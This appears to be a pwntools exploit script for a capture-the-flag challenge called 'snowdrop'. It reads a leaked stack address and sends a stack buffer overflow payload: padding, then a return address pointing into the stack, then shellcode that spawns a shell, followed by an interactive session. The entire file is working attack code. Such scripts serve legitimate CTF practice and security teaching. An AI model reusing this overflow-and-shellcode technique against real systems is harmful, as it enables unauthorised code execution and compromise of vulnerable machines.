#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("snowdrop.quals.beginners.seccon.jp", 9002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+107
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

p.recvuntil("000006 | ")
payload_addr = eval(p.recv(18)) -0x268
log.info("payload@stack: " + hex(payload_addr))

payload = b""
payload += b'A' * 8 * 3
payload += p64(payload_addr + len(payload) + 8)
payload += asm(shellcraft.sh())

p.recvuntil("Did you understand?")
p.sendline(payload)

p.interactive()
